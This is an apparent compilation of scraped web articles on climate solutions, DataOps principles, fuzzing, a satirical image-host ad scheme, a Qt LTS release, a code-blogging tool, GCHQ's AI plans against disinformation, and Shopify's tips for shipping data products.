over decades. Protecting nature’s current carbon sinks and adding new ones is a long-game, based on building carbon stocks in trees and soil. We should start this work today and continue to protect our natural ecosystems and regeneratively manage our working lands through the next few decades and beyond.</p></div></div></section><section><div><div><p id="62eb">The other waves can address <em>most</em> of our emissions and create <em>significant</em> new carbon sinks. But there are areas that are <strong>difficult to decarbonize</strong> and will require new technology. And there are opportunities to use technology to <strong>remove carbon from the atmosphere</strong> beyond what nature-based solutions can do. This is where focused research and development efforts, starting today, could pay off in the long run.</p><p id="3e7a">This wave of climate solutions depends on new technology, but as an “end game” move in the <a rel="noopener" href="https://globalecoguy.org/we-need-to-see-the-whole-board-to-stop-climate-change-98be66412281">climate chess match</a>. These will take time to develop, so we should rely on other, existing solutions in the next two decades, leaving these new technologies for the final moves.</p><p id="df23">Specifically, I think we need to focus on research and development, starting today, to <strong>make carbon-free cement, steel, plastic, and jet fuel</strong>. There are pilot projects to do this today, but they are far from economically competitive and scalable. But with some significant investment, I am confident we can find good, cheap, reliable ways to do this in the coming decades.</p><p id="8601">In addition, there are interesting ideas about <strong>removing carbon from the atmosphere using a variety of industrial and chemical processes</strong>. At present, these are only small pilot projects, not nearly enough to make a dent in the atmosphere. But with a decade or two of additional research and development, these technologies may mature to be able to remove our last, hard-to-decarbonize emissions in the 2040s.</p><p id="64d5">A (potentially big) mistake would be to let the promise of carbon removal technology be an excuse to delay immediate emissions cuts. These technologies are likely decades away and only absorb some of our final emissions.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <div> <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div id="post-content" itemprop="articleBody"> <p>These are 10 of the principles of <a href="https://blog.tinybird.co/2021/02/27/dataops/">DataOps</a> that we make available to data teams.</p> <p>While we always challenge our assumptions, this new paradigm guides the way we are building Tinybird, deeply focused on simplicity, speed and developer experience.</p> <h3 id="1-the-data-project"> 1. The Data Project <a href="#1-the-data-project">¶</a> </h3> <p>This is like your framework (<em>think of MVC for web development</em>). It describes how your data should be stored, processed, and exposed through APIs.</p> <p>You put there your <a href="https://docs.tinybird.co/cli.html#data-projects-title">know-how</a>, abstractions and the focus on the problem you are solving.</p> <h3 id="2-serialization"> 2. Serialization <a href="#2-serialization">¶</a> </h3> <p>All your table schemas, transformations and endpoints need to be serializable. Keep <a href="https://docs.tinybird.co/cli.html#datafile-reference-title">the format</a> simple for humans to read and write. If possible, map every resource to a text file.</p> <h3 id="3-version-control"> 3. Version Control <a href="#3-version-control">¶</a> </h3> <p>This is a consequence of having a data project and a file format. Treat your data project as regular source code, and <a href="https://blog.tinybird.co/2021/01/22/tech-product-design-how-we-integrate-with-git/">push it to a source version control system</a> (e.g. git)</p> <p>From there you get traceability over changes, collaboration, peer reviews, automations and the very same workflow and best practices you are used to as a development team.</p> <h3 id="4-continuous-integration-and-deployment"> 4. Continuous Integration and Deployment <a href="#4-continuous-integration-and-deployment">¶</a> </h3> <p>The key for most of the things developers do is speed. Innovation is iteration and if you are fast you can learn faster and iterate faster.</p> <p>This means making an assumption, running an experiment, learn and repeat, ensuring quality.</p> <p>Your system should allow you to easily create testing environments and use fixtures, so you can build, test and measure your data pipelines and endpoints on every change.</p> <h3 id="5-lead-time"> 5. Lead Time <a href="#5-lead-time">¶</a> </h3> <ul> <li>Deploying to production should be seconds (<em>not minutes or hours</em>)</li> <li>Fixing a bug should be minutes (<em>not hours or days</em>)</li> <li>Developing a new feature should be hours (<em>not days or weeks</em>)</li> </ul> <h3 id="6-data-quality-assurance"> 6. Data Quality Assurance <a href="#6-data-quality-assurance">¶</a> </h3> <p>So you are a data engineer working for a Fortune 500 company, are you confident enough (<em>or even allowed</em>) to make a change in any of your data pipelines and push it to production right away in a matter of minutes?</p> <p>How do you ensure data quality in your data product?</p> <p><strong><a href="https://guides.tinybird.co/guide/implementing-test-strategies">Data needs tests</a>, even more than code.</strong></p> <h3 id="7-tools"> 7. Tools <a href="#7-tools">¶</a> </h3> <p>Pick tools based on your goals, but as a starting point, your tools should make it easy for your team to access, share, and analyze data.</p> <p>You should be able to <a href="https://docs.tinybird.co/cli.html">work from your terminal</a> or IDE without leaving your data project context.</p> <p>Avoid steep learning curves, use a familiar syntax, short and clear so you can run and automate stuff quickly.</p> <p>When it comes to data exploration and problem-solution discovery, you need instant feedback.</p> <h3 id="8-observability"> 8. Observability <a href="#8-observability">¶</a> </h3> <p>You need to run and understand <a href="https://docs.tinybird.co/api-reference/service-datasources.html">your data in production</a> and quickly learn if it’s solving your business problems.</p> <p>Automate <a href="https://guides.tinybird.co/guide/on-the-fly-health-checks">health checks</a>, monitor performance, allow runtime traceability and implement an alerting system.</p> <h3 id="9-recipes-and-building-blocks"> 9. Recipes and building blocks <a href="#9-recipes-and-building-blocks">¶</a> </h3> <p>The data development experience should be as close as the experience you actually have working with some library that you will import and use in any language.</p> <p>Your analysis should be idempotent, composable and immutable. Wrap them and make them reusable right away.</p> <p>Wrap your analyses into <a href="https://github.com/tinybirdco/log_parsing_template">reusable data projects</a>.</p> <h3 id="10-fine-tuning"> 10. Fine Tuning <a href="#10-fine-tuning">¶</a> </h3> <p>Query optimization is a never ending process. You should monitor queries and transformations to build a system that helps <a href="https://blog.tinybird.co/2020/12/15/eating-our-own-dog-food-how-we-investigate-performance-bottlenecks-using-our-product-and-google-sheets/">fine tuning your data products</a>.</p> <h3 id="bonus-track-publication-and-documentation"> Bonus track: publication and documentation <a href="#bonus-track-publication-and-documentation">¶</a> </h3> <p><strong>Data and development teams work together</strong>. Your data are exposed as <a href="https://blog.tinybird.co/2020/08/11/badass-api-endpoint/">auto-documented APIs</a>, so it can be integrated anywhere.</p> <p>Don’t forget about not so cool tools such as <a href="https://blog.tinybird.co/2020/12/15/eating-our-own-dog-food-how-we-investigate-performance-bottlenecks-using-our-product-and-google-sheets/#visualizing-the-correlation-matrix-in-google-sheets">spreadsheets</a> and traditional BI.</p> <p><strong><em>What are your main challenges when dealing with large quantities of data?</em></strong> <a href="https://www.tinybird.co/survey">Tell us about them</a> and get started solving them with Tinybird right away.</p> </div>  </article>  </div> </div></div>]]>

<p>In recent years, feedback-based fuzzing (or coverage-guided fuzzing) has experienced an unmatched success story. For example, over 27,000 bugs have been found in Chrome and several open-source projects and Google stated that it finds around 80% of its bugs with modern fuzzing techniques. However, fuzzing is not only reserved for big tech companies: It is gradually finding its way into the wide world.</p>
<p><span>Fuzzing is used for security and stability testing of the codebase. The application under test is fed with a series of inputs, which are smartly mutated in the testing process. The testing tool gets feedback about the code covered during the execution of inputs. Unlike traditional or black-box fuzzing, feedback-based fuzzing explores the program state efficiently and discovers bugs hidden deep in the code. If you want to learn more in detail about the underlying technology, we recommend you to read our blog post <a href="https://blog.code-intelligence.com/the-magic-behind-feedback-based-fuzzing?hsLang=en"><span>The Magic Behind Feedback-based Fuzzing.</span></a>&nbsp;</span></p></span></p>

After filtering candidates based on relevant traits such as age, marital status and naivety, we finally settled on our new CAISO!</p>
<p>He came in with some fresh new ideas, most of which were rejected outright, and we quickly got him working on the next big thing.
IMGZ has been <a href="https://imgz.org/blog/2020/12/23/haha-suckers/">growing exponentially</a>, and, despite all the problems that come with growth, our focus is LASER-focused on one thing:
Money.
We want to make lots and lots of money, as much as possible, as fast as possible.
Our motto is "At IMGZ, images come first, after money".</p>
<p>Given this imperative, we got our finger on the pulse of the webiverse, and realized that, if we were going to make money, we couldn't rely on people paying us money for services.
That's just not the way the web operates.
We needed to take a page from the book of Facebook, Google, Amazon and AltaVista and innovate, so we sat down with our new CAISO and thought long and hard about how AI could aid us in our monetization strategy, and finally came up with a radical new monetization model:</p>
<p>Ads.</p>
<h2>Ads</h2>
<p>Ads on the internet are not new.
They've been around for at least two years, and people are getting tired of them already.
They aren't so much getting tired of <em>seeing</em> ads, which are always relevant and nigh-magical in their pinpointing of the exact thing you're wanting to buy at any given time, but they're getting tired of the sacrifices needed to achieve this accuracy.</p>
<p>They're getting tired of the constant invasion of privacy by internet giants, who impinge on people's rights to sell them exactly the right thing at exactly the right time.</p>
<p>At IMGZ, we believe that AI can help.
Help the users preserve their privacy, help the advertisers present their products in a respectful manner, but, most importantly, help us make lots of money.</p>
<p>We present to you:</p>
<p>Privacy-preserving ads.</p>
<h2>Privacy-preserving ads</h2>
<p>Privacy-preserving ads is a brand-new technology, from the innovative free-thinkers of IMGZ.
We dared to ask the question "how can we monetize the free trial?".
The obvious answer was "ads".</p>
<p>However, tracking the user and placing some relevant ads next to the images as they viewed them was too invasive, and protecting our users' privacy is the third most important priority for us.</p>
<p>We thought long and hard, and, leveraging our latest hire, we quickly came up with a design for an ML-powered pipeline:</p>
<ul>
<li>The uploading frontend ingests images and sends them to a Kafka queue.</li>
<li>If the image belongs to a user on the free trial, Kafka forwards the images to a distributed worker pool for deep learning processing with a custom Keras model.</li>
<li>The Keras model performs saliency detection to find the most important parts of the image.</li>
<li>Once the most important parts of the image are identified, we send the image back to Kafka for forwarding to the next step in the pipeline, categorization.</li>
<li>A second Keras model performs label extraction on the image, to find a few categories that the image belongs to (such as "woman, dress, smiling").</li>
<li>The next step processes the image, selecting the best ad for the category and stitching it into the salient parts of the image.</li>
<li>The image is stored and forwarded to the CDN for serving.</li>
</ul>
<p>After lots of back and forth, we finalized this plan and realized we couldn't be bothered to do any of this and just wrote three lines of OpenCV to detect faces and slap our logo on them:</p>
<p><a href="https://imgz.org/i7GXsVuM/"><img src="https://imgz.org/i7GXsVuM-1280.jpg" alt=""></a></p>
<p>You will notice that you can't tell who this guy is, perfectly preserving his privacy.
In fact, we're sure you didn't even notice this is actually <em>a girl</em>.</p>
<p><strong>That</strong> is the power of AI.</p>
<h2>The power of AI</h2>
<p>With the help of our engineers, we managed to take this solution from an average of 68 seconds per image to near <em>real-time</em>.
As the free-trial user uploads an image, detection and advertization runs in a few milliseconds, ruining the image nearly instantly and resulting in happy advertisers and users who retained their privacy.</p>
<p>For example, try to recognize even one person in this photo, where the photographer did not obtain model releases:</p>
<p><a href="https://imgz.org/i3yjnGcF/"><img src="https://imgz.org/i3yjnGcF-1280.jpg" alt=""></a></p>
<p>You'll find that you can't!
You may, however, get an inexplicable urge to sign up for IMGZ, which is exactly the intended effect of the subtle advertising.</p>
<p>Of course, while trial users enjoy the full suite of privacy-preserving tools IMGZ has to offer, paid users will be subject to no such annoyance.
Their images will be uploaded and served entirely unchanged, as a thank-you from us to their money.</p>
<h2>Epilogue</h2>
<p>Of course, none of this would be possible without the help of one man:</p>
<p><a href="https://imgz.org/ipFmfjaJ/"><img src="https://imgz.org/ipFmfjaJ-1280.jpg" alt=""></a></p>
<p>He's still on the trial account, as he hasn't paid for an IMGZ account yet, but he'll have to when his trial expires.</p>
<p>We hope that this short article has given you some insight in the pioneering research that goes on at IMGZ in the fields of both privacy and monetization, and maybe you'll implement some of these ideas in your own companies, for only a modest fee to us.</p>
<p>Enjoy, and don't forget, <a href="https://imgz.org/#login">the signup link is here</a>.</p>

March 4, 2021 | https://www.qt.io/blog/commercial-lts-qt-5.15.3-released | <a href="https://web.archive.org/web/*/https://www.qt.io/blog/commercial-lts-qt-5.15.3-released">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>We <a href="https://www.qt.io/blog/qt-offering-changes-2020" rel="noopener" target="_blank">announced</a> a bit over one year ago that the long-term supported releases of Qt 5.15 will be available only for commercial license holders. Today we have released Qt 5.15.3 LTS, the first commercial only patch release to Qt 5.15 LTS series. As a patch release, Qt 5.15.3 does not add any new functionality but provides bug fixes and other improvements.</p>
<!--more-->
<p>Compared to Qt 5.15.2, the new Qt 5.15.3 contains close to 250 bug fixes. All the applicable bug fixes are also part of the upcoming <a href="https://wiki.qt.io/Qt_6.1_Release" rel="noopener" target="_blank">Qt 6.1</a> release targeted to be released in April.</p>
<p>We have adjusted the process of change files and instead of separate changelog for each module you can check the overview of all important changes and bug fixes in the Qt 5.15.3 from <a href="https://account.qt.io/" rel="noopener" target="_blank">the release note found in the Qt Account portal</a>.</p>
<p>Qt 5.15.3 is automatically visible for all commercial license holders in the online installer (maintenance tool). The source packages of Qt 5.15.3 are available via the online installer as well as the Qt Account. The offline packages for Qt 5.15.3 are available from the Qt Account portal.</p>
<p>If you want to access the source code repository, it can be done via the <a href="https://codereview.qt-project.org/" rel="noopener" target="_blank">Codereview</a>&nbsp;system. Just log in with a Qt Account that has a valid commercial license, and you will be able to access the LTS repositories. For more details, please check <a href="https://wiki.qt.io/Qt_5.15_Release#Getting_Source_Codes" rel="noopener" target="_blank">the instructions for accessing the commercial LTS repositories</a>.</p>
<p>Qt for Device Creation images are also available for Qt 5.15.3 LTS. If you want to build yourself with yocto, use the meta-qt5 layer from the Qt repository. We have updated the yocto meta-qt5 layer of Qt 5.15.3 to point to the commercial LTS repositories. For more details, please check <a href="https://doc.qt.io/QtForDeviceCreation-5.15/qtee-meta-qt5.html" rel="noopener" target="_blank">the instructions on using yocto with access to the commercial LTS repositories</a>.</p>
<p>If you have any problems with the commercial LTS releases, please contact Qt Support. You can also create bugs to <a href="https://bugreports.qt.io/" rel="noopener" target="_blank">https://bugreports.qt.io</a>, but in addition it is recommended to notify the support team about it.</p>
<p>Next commercial-only LTS patch release, Qt 5.15.4 is planned to be released at the end of April.</p></span></p></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1612806590421/HzFmerMxA.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>So, I’ve been <strong>code-blogging</strong> (a fancy term I’ve come up with) for <a target="_blank" href="https://areknawo.com/">over 2 years now</a>. And to be honest, it’s been a fantastic experience! Not only did it gave me a chance to share my knowledge, but also to establish my position in the industry.</p>
<p>But I know I’m not the only one! Code-blogging has been rising steadily in popularity, as more and more knowledgeable people enter the field, with intention of sharing and build their portfolios.</p>
<p>With that said, there is one pretty significant downside to code-blogging, and that is <strong>the lack of tooling</strong>. Blogging in this niche requires the creator to deal with things that aren’t required anywhere else, like <strong>code snippets</strong>. Different platforms and tools handle such things differently, with varying <strong>user-friendliness</strong>.</p>
<p>Personally, none of them delivered the experience that I’d deemed good, requiring me to copy-paste my code snippets for formatting and handling compatibility issues across publishing platforms.</p>
<p>And that’s why I created <strong>CodeWrite</strong>!</p>

<p>CodeWrite is a writing tool designed specifically for code-blogging, that comes in a form of a <strong>browser extension</strong>. I’d go as far as to say that it’s one-of-a-kind and thus <em>the best code-blogging tool</em>.</p>
<p>It brings code-blogging to the next level, thanks to a <strong>beautifully-crafted editing experience</strong> with a full-fledged, batteries-included <strong>code editor</strong> for handling your code snippets!</p>
<p>But that’s not all! CodeWrite was created with intention of making every aspect of code-blogging better - including publishing!</p>
<p>In this aspect, CodeWrite introduces something that hasn’t been done before - <strong>one-click publishing</strong>. This means that you can write your post, pin it, and go to one of supported services (for start these are <a href="http://dev.to/" target="_blank">Dev.to</a>, Hashnode, and Medium), open the CodeWrite pop-up, and click the publishing button! CodeWrite will automatically detect all known incompatibilities - like too large images or lack of code highlighting - and allow you to choose the solution - in our example, resize the image, and use GitHub Gists (access token required)!</p>
<p>But I won’t bother you with marketing, as there’s a lot more to talk about - like great compatibility with Grammarly, included search, offline support, and standalone mode. No. Instead, you should go and see it for yourself!</p>
<p>So, if you’re a code-blogger and want to make your work that much more pleasing - go to <a target="_blank" href="https://codewrite.io/">codewrite.io</a>, hit download, and give it a try in a demo mode!</p>
<p>CodeWrite starts at <strong>$3/month</strong> (a penny compared to time and friction saved), but there’s a treat for you - dear reader of this announcement post!</p>
<blockquote>
<p>Use the code <strong>first100</strong> to get <strong>20% off</strong> - lifetime! But that’s only for the first 100 of you!</p>
</blockquote>
<p>So, thanks for checking out CodeWrite, and leave your thoughts below! Also, be sure to upvote CodeWrite on <a target="_blank" href="https://www.producthunt.com/posts/codewrite">ProductHunt</a>, follow the development on <a target="_blank" href="https://twitter.com/codewriteio">Twitter</a>, and check out the <a target="_blank" href="https://discord.gg/W68KyVPBdP">CodeWrite Discord</a> for on-going CodeWrite discussions! See you there - on the brighter side of code-blogging!</p>
<p>And yes - this piece was written using CodeWrite!</p>

March 4, 2021 | https://techmonitor.ai/ai/gchqs-plans-ai-tackle-disinformation-thorny-questions | <a href="https://web.archive.org/web/*/https://techmonitor.ai/ai/gchqs-plans-ai-tackle-disinformation-thorny-questions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><span>Last week, UK intelligence agency GCHQ revealed its ambition to use artificial intelligence (AI) to combat a number of social ills, including disinformation. Possible applications include detecting deep fakes, blocking botnets and automated fact-checking, a report from the agency said. But these proposals raise both practical questions and deeper quandaries, including who gets to define disinformation.&nbsp;</span>
</p><figure id="attachment_6493" aria-describedby="caption-attachment-6493"><img src="https://techmonitor.ai/wp-content/uploads/sites/20/2021/03/GCHQ-aerial-658x370.jpg" alt="GCHQ AI disinformation" width="658" height="370" srcset="https://techmonitor.ai/wp-content/uploads/sites/20/2021/03/GCHQ-aerial-658x370.jpg 658w, https://techmonitor.ai/wp-content/uploads/sites/20/2021/03/GCHQ-aerial-270x152.jpg 270w" sizes="(max-width: 658px) 100vw, 658px"><figcaption id="caption-attachment-6493">An aerial image of the Government Communications Headquarters (GCHQ) in Cheltenham, Gloucestershire. (Photo courtesy of the Ministry of Defence)</figcaption></figure>
<p><span>The UK’s security apparatus has become increasingly interested in disinformation and online speech in recent years, following intense focus on allegations that Russia attempted to interfere with the 2016 US presidential election <a href="https://www.thenation.com/article/archive/russiagate-elections-interference/">using social media</a>. </span>
</p><p><span>T</span><span>he Russia report, released by the Intelligence and Security Committee in July 2020, <a href="https://tech.newstatesman.com/policy/russia-report-mi5-social-media">proposed a role</a> for the UK’s security agencies – specifically MI5 – in policing social media content, something it termed ‘defending the UK’s discourse’. It highlighted that MI5 already works with social media companies to identify and remove terrorist content, so was the natural agency to take on an appended role covering disinformation.&nbsp;</span></p>
			
<p><span>The report suggested: “GCHQ might attempt to look behind the suspicious social media accounts that open-source analysis has identified to uncover their true operators (and even disrupt their use).”</span></p></div><div>
<p>Since then, military bodies have become more involved in the ‘fight’ against online misinformation. Nato has taken on <a href="https://www.nato.int/cps/en/natohq/177273.htm">a role</a> countering Covid-19-related disinformation, and GCHQ is currently undertaking an offensive cyber-operation against anti-vaccine content purportedly spread online by ‘hostile states’. “GCHQ has been told to take out anti-vaxxers online and on social media,” a well-placed source <a href="https://www.thetimes.co.uk/article/gchq-in-cyberwar-on-anti-vaccine-propaganda-mcjgjhmb2">told the <em>Times</em>.</a>
</p>
<h2>Using AI to tackle disinformation</h2>
<p><span>In the new paper, GCHQ’s hypothetical AI-enabled tools to tackle disinformation include machine-assisted fact-checking through validation against trusted sources, detecting deep fake media content, detecting and blocking botnets with machine-generated social media accounts, and online operations to counteract malicious accounts.</span>
</p><p><span>The proposals raise some practical questions. The major social media platforms – the main sites of disinformation spread – have already rolled out their own AI-enabled tools to detect disinformation. For example, to help identify viral misinformation, Facebook <a href="https://ai.facebook.com/blog/heres-how-were-using-ai-to-help-detect-misinformation/">uses SimSearchNet++</a>, an image matching model trained using self-directed learning, an AI system that can recognise images and text with only minor tweaks using a tool called ObjectDNA, as well as tools to detect deep fakes.&nbsp;</span>
</p><p><span>It is unclear what GCHQ would add by deploying its own tools – and indeed whether the social media platforms would permit it to do so. Facebook, for example, does not allow GCHQ or other security agencies to run such tools on its platform, although it does work closely with law enforcement in other areas. And </span><span>taking action on social media accounts independently of the platforms could expose GCHQ to legal challenges.&nbsp;</span>
</p>
<p>But a bigger issue for GCHQ’s planned use of AI against disinformation could be the subjectivity of the concept, which has no legal basis in the UK.
</p><p><a href="https://techmonitor.ai/newsletter">[<em>Keep up with Tech Monitor: Subscribe to our weekly newsletter</em>]</a>
</p><h2>Who defines disinformation?</h2>
<p><span>The terms ‘misinformation’ or ‘disinformation’ can be easily abused by states to police civilian speech and restrict freedom of expression. </span><span>A Broadband Commission <a href="https://www.broadbandcommission.org/Documents/working-groups/FoE_Disinfo_Report.pdf">report</a> identifies that governments including Bahrain, Cambodia, Kazakhstan and Thailand have taken this approach. </span>
</p><p><span>“The paradox to highlight here is that governments that appear to be seeking to control speech for political gain try to legitimise their actions by referring to hate speech regulations and anti-disinformation laws,” the report reads. “In other words, disinformation responses risk being used (or justified for use) for censoring legitimate expression – and clearing the field for official disinformation to spread unchecked.”</span>
</p><p><span>Trisha Meyer, an assistant professor in digital governance and participation at Vesalius College of the Vrije Universiteit Brussel, stresses the need to distinguish between different types of ‘harmful’ material, especially between those that are legal and illegal. </span><span>Rights groups have repeatedly <a href="https://www.indexoncensorship.org/2019/04/online-harms-proposals-pose-serious-risks-to-freedom-of-expression-online/">urged legislators</a> to steer away from woolly definitions of ‘harm’ when devising laws for social media platforms – for example, concerning the UK’s upcoming Online Harms bill.&nbsp;</span>
</p>
<p>Citizens should be wary of security agencies, <span><a href="https://www.democraticaudit.com/2018/10/03/audit2018-how-accountable-are-the-uks-security-and-intelligence-services-to-parliament/">whose activities are often closed to public or parliamentary scrutiny</a>, policing public speech, Meyer adds</span><span>. </span><span>“I think there is a need for scrutiny… and accountability is important.” She points to parallels with GCHQ’s <a href="https://www.bbc.com/news/uk-45510662">bulk surveillance programmes</a> that were revealed in the Snowden leaks. “What happens if you get flagged as having posted harmful content and then you get put on a list?” says Meyer. “There’s a lot of that I do think we need to be concerned about.”</span>
</p><p><span>This lack of accountability is exacerbated by the use of AI technologies, which are often inscrutable even to the organisations using them. Platforms including Facebook, YouTube and Twitter have all warned that their increased use of AI for content moderation is <a href="https://www.npr.org/2020/03/31/820174744/facebook-youtube-warn-of-more-mistakes-as-machines-replace-moderators?t=1614784618272">likely to lead to mistakes</a>. “We need to make sure that AI and automated technology isn’t an additional excuse of saying… that we’re unable to be held accountable,” says Meyer.&nbsp;&nbsp;</span>
</p><p><span>An even deeper issue is the fact that these approaches focus on how the problem of disinformation manifests, rather than its root cause. Meyer says that much of the discussion around disinformation focuses on making platforms responsible, rather than the “far deeper-seated societal issues” that might lead people to be susceptible to disinformation or distrustful of the state-endorsed narrative. </span>
</p><p><span>“If you simply take down content, that might solve it in the short term, but it’s not going to help from a longer-term perspective,” she says. “It’s not going to create that social cohesion or that trust that you need in government.”</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>Shipping a new product is hard. Doing so under tight time constraints is even harder. It’s no different for data-centric products. Whether it’s a forecast, a classification tool, or a dashboard, you may find yourself in a situation where you need to ship a new data product in a seemingly impossible timeline.&nbsp;</p>
<p>Shopify’s Data Science team has certainly found itself in this situation more than a few times over the years. Our team focuses on creating data products that support our merchants’ entrepreneurial journeys, from their initial interaction with Shopify, to their first sale, and throughout their growth journey on the platform. Commerce is a fast changing industry, which means we have to build and ship fast to ensure we’re providing our merchants with the best tools to help them succeed.</p>
<p>Along the way, our team learned a few key lessons for shipping data products quickly, while maintaining focus and getting things done efficiently—<em>but also done right.</em> Below are four tips that are proven to help you ship new products fast.&nbsp;</p>

<p>Investing time in a design sprint pays off down the line as you approach deadlines. The design sprint (created by <a href="https://www.gv.com/sprint/" target="_blank" title="Google Ventures" rel="nofollow noopener noreferrer">Google Ventures</a>) is “a process for answering critical business questions through design, prototyping and testing ideas with customers.” Sprints are great for getting a new data product off the ground quickly because they carve out specific time blocks and resources for you and your team to work on a problem. The Shopify Data Science teams make sprints a common practice, especially when we’re under a tight deadline. When setting up new sprints, here are the steps we like to take:</p>
<ol>
<li>
<strong><em>Choose an impactful problem to tackle. </em></strong>We focus on solving problems for our merchants, but in order to do that, we first have to uncover what those problems are by asking questions. <em>What</em> is the problem we’re trying to solve? <em>Why </em>are we solving this problem? Asking questions empowers you to find a problem worth tackling, identify the right technical solution and ultimately drive impact.</li>
<li>
<strong><em>Assemble a small sprint team</em></strong>: Critical to the success of any sprint is assembling a small team (no more than 6 or 7) of highly motivated individuals. Why a small team? It’s easier to stay aligned in a smaller group due to better communication and transparency, which means it’s easier to move fast.</li>
<li>
<strong><em>Choose a sprint Champion:</em></strong> This individual should be responsible for driving the direction of the project and making decisions when needed (should we use solution A or B?). Assigning a Champion helps remove ambiguity and allow the rest of the team to focus their energy on solving the problem in front of them.</li>
<li>
<strong><em>Set your sprint dates:</em></strong> Timeboxing is one of the main reasons why sprints are so effective. By setting fixed dates, you're committing your team to focus on shipping on a precise timeline. Typically, a sprint lasts up to five days. However, the timeline can be shortened based on the size of the project (for example, three days is likely enough time for creating the first version of a dashboard that follows the impact of COVID-19 on the business’s acquisition funnel).</li>
</ol>
<p>With your problem identified, your team set up, and your dates blocked off, it’s now time to sprint. Keep in mind while exploring solutions that solving a data-centric problem with a non-data focused approach can sometimes be simple and time efficient. For instance, asking a user for its preferred location rather than inferring it using a complex heuristic.</p>

<p>Speed is critical! The first iterations of a brand new product often go through many changes. Prototypes allow for quick and cheap learning cycles. They also help prevent the sunk cost fallacy (when a past investment becomes a rationale for continuing).&nbsp;</p>
<p>In the data world, a good rule of thumb is to leverage spreadsheets for building a prototype. Spreadsheets are a versatile tool that help accelerate build times, yet are often underutilized by data scientists and engineers. By design, spreadsheets allow the user to make sense of data in messy contexts, with just a few clicks. The built-in functions cover most basic use cases:&nbsp;</p>
<ul>
<li>cleaning data by hand rapidly</li>
<li>displaying graphs</li>
<li>computing basic ranking indices</li>
<li>formatting output data.</li>
</ul>
<p>While creating a robust system is desirable, it often comes at the expense of longer building times. When releasing a brand new data product under a tight timeline, the focus should be on developing prototypes fast.&nbsp;</p>
<figure><img alt="A sample Google Sheet dashboard evaluating Inbound Leads.  The dashboard consists of 6 charts.  The 3 line charts on the left measure Lead Count, Qualification Rate %, and Time to Qualification in Minutes.  The 3 bar charts on the right  measure Leads by Channel, Leads by Country, and Leads by Last Source Touched." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/google-sheets-dashboard-prototype_8e7a900e-b66d-4618-a4d0-fdb26359a44b.jpg?v=1614705455" src="https://cdn.shopify.com/s/files/1/0779/4361/files/google-sheets-dashboard-prototype_8e7a900e-b66d-4618-a4d0-fdb26359a44b.jpg?v=1614705455">
<figcaption>An example of a dashboard prototype created within Google Sheets.</figcaption>
</figure>
<p>Despite a strong emphasis on speed, a prototype should still look and feel professional. For example, the first iteration of the <a href="https://www.shopify.my/blog/marketing-attribution" target="_blank" title="Marketing Attribution: Seeing the Customer Journey More Clearly" rel="noopener noreferrer">Marketing attribution tool</a> developed for Shopify’s Revenue team was a collection of SQL queries automated by a bash script. The output was then formatted in a spreadsheet. This allowed us to quickly make changes to the prototype and compare it to out-of-the-box tools. We avoided any wasted effort spinning up dashboards, production code, as well as any sentimental attachment to the work, which made it easier for the best solution to win.</p>

<p>When building a new data product, it’s tempting to spend lots of time on a flashy machine learning algorithm. This is especially true if the product is supposed to be “smart”. Building a machine learning model for your first iteration can cost a lot of time. For example, when sprinting to build a lead scoring system for our Sales Representatives, our team spent 80% of the sprint gathering features and training a model. This left little time to integrate the product with the existing <a href="https://en.wikipedia.org/wiki/Customer_relationship_management" target="_blank" title="Customer Relationship Management on Wikipedia" rel="nofollow noopener noreferrer">customer relationship management</a> (CRM) infrastructure, polish it, and ask for feedback. A simple ranking using a proxy metric would be much faster to implement for the first iteration. The time gained would allow for more conversations with the users about the impact, use and engagement with the tool.&nbsp;</p>
<p>We took that lesson to heart in our next project when we built a sales forecasting tool. We started with a linear regression using only two input variables that allowed us to have a prototype ready in a couple of hours. Using a simple model allowed us to ship fast and quickly learn whether it solved our user’s problem. Knowing we were on the right track, we then built a more complex model using machine learning.</p>
<p>Focus on building models that solve problems and can be shipped quickly. Once you’ve proven that your product is effective and delivers impact, then you can focus your time and resources on building more complex models.&nbsp;</p>

<p>Shipping fast also means shipping the right product. In order to stay on track, gathering feedback from users is invaluable! It allows you to build the right solution for the problem you’re tackling. Take the time to talk to your users, before, during, and after each build iteration. Shadowing them, or even doing the task yourself is a great return on investment.</p>
<p>Gathering feedback is an art. Entire books and research papers are dedicated to it. Here are the two tips we use at Shopify that increased the value of feedback we’ve received:</p>
<ul>
<li>
<em>Ask specific questions.</em> Asking, “Do you have any feedback?” doesn’t help the user direct their thoughts. Questions like, “How do you feel about the speed at which the dashboard loads?” or “Are you able to locate the insights you need on this dashboard to report on top of funnel performance?” are more targeted and will yield richer feedback.</li>
</ul>
<ul>
<li>
<em>Select a diverse group of users for feedback</em>. Let’s suppose that you are building a dashboard that’s going to be used by three regional teams. It’s more effective to send a request for feedback to one person in each team rather than five people in a single team.</li>
</ul>
<figure><img alt="A sample Google Form that measures Prototype A's Scoring.  The form consists of 2 questions. The first question is &quot;Is the score easy to parse and interpret? It is scored using a ranking from 1 - 5 with 1 = Very Hard and 5 = Very Easy. The 2nd question is &quot;Additional Comments&quot; and has a text field for the answer." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/sample-google-form.jpg?v=1614705664" src="https://cdn.shopify.com/s/files/1/0779/4361/files/sample-google-form.jpg?v=1614705664">
<figcaption>Feedback our team asked for the scoring system we created. When asking for feedback, you want to ask specific questions so you can yield better feedback.</figcaption>
</figure>
<p>We implemented the two tips when requesting feedback from users of the sales forecasting tool highlighted in the previous section. We asked a diverse group specific questions about our product, and learned that displaying a numerical score (0 - 100) was confusing. The difference between scores wasn’t clear to the users. Instead, it was suggested to display grades (A, B, C) which turned out to be much quicker to interpret and led to a better user experience.</p>
